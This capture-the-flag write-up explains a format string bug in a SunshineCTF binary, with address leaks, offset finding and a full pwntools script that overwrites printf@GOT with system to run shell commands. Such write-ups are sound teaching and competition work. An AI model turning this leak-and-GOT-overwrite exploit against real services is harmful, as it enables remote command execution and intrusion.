---
title: "Mad Libs"
author: "s0g3king"
date: 2026-09-28
categories: ["Pwn", "SunshineCTF 2026"]
tags: ["format string", "got overwrite"]
partial_solve: false
used_ai: false
---

## Challenge

A 64-bit ELF `mad_libs`, shipped with its own `libc.so.6` and `ld`, served at
`nc chal.sunshinectf.games 26001`. It asks you to "fill in the blanks" eight
times. Mitigations are basically all on:

```text
Arch:     amd64
RELRO:    Partial RELRO
Stack:    Canary found
NX:       enabled
PIE:      enabled
```

Partial RELRO is the important one: the GOT is still writable at runtime.

## Recon

`main` loops eight times, and each round reads a line and prints it straight
back:

```c
char input[264];
for (int i = 0; i < 8; i++) {
    printf("(%d) > ", i + 1);
    if (fgets(input, 0x100, stdin) == NULL) break;
    printf(input);              // <-- user string used as the format string
}
```

`printf(input)` with attacker-controlled `input` is a textbook **format string
bug**, and the loop hands it to us eight times over — plenty of room to leak and
then write.

The plan, given Partial RELRO:

1. Leak a libc address and the binary's base with `%p`, so we can defeat ASLR/PIE.
2. Use the format string as an arbitrary write to overwrite `printf@GOT` with
   `system`.
3. From then on, every `printf(input)` is really `system(input)`, so the next
   line we send runs as a shell command.

**Finding the leaks.** Spraying `%1$p %2$p ...` up the stack shows two useful
slots for this build:

- **index 43** lands inside libc — `system` is at `leak + 189814`.
- **index 47** lands in the main image — `printf@GOT` is at `leak + 11847`.

**Finding the write offset.** The format string's own arguments start at stack
index **8**, which is the `offset` pwntools needs to place its writes correctly.

## Exploit

Round one leaks both bases; round two overwrites `printf@GOT` with `system`
using `fmtstr_payload`; round three sends the command, which is now executed by
`system`:

```python
#!/usr/bin/env python3
from pwn import *

elf  = context.binary = ELF("./mad_libs_patched")
libc = ELF("./libc.so.6")

p = remote("chal.sunshinectf.games", 26001)

# 1) leak libc + PIE base
p.sendlineafter(b">", b"%43$p %47$p")
res       = p.recvline().decode().split()
libc_leak = int(res[0], 16)
bin_leak  = int(res[1], 16)

printf_got  = bin_leak  + 11847      # printf entry in the GOT
system_addr = libc_leak + 189814     # system() in the loaded libc
log.info(f"system: {hex(system_addr)} | printf@got: {hex(printf_got)}")

# 2) overwrite printf@GOT -> system   (fmtstr args start at index 8)
offset  = 8
payload = fmtstr_payload(offset, {printf_got: system_addr})
p.sendlineafter(b">", payload)

# 3) printf(input) is now system(input)
p.sendline(b"cat flag.txt")
flag = p.recvline_contains(b"sun{")
log.success(flag.decode())
```

Once `printf@GOT` points at `system`, the very next call in the loop —
`printf("(%d) > ", ...)` — is already `system(...)` on a harmless string, and
then our `printf(input)` fires as `system("cat flag.txt")`, printing the flag.

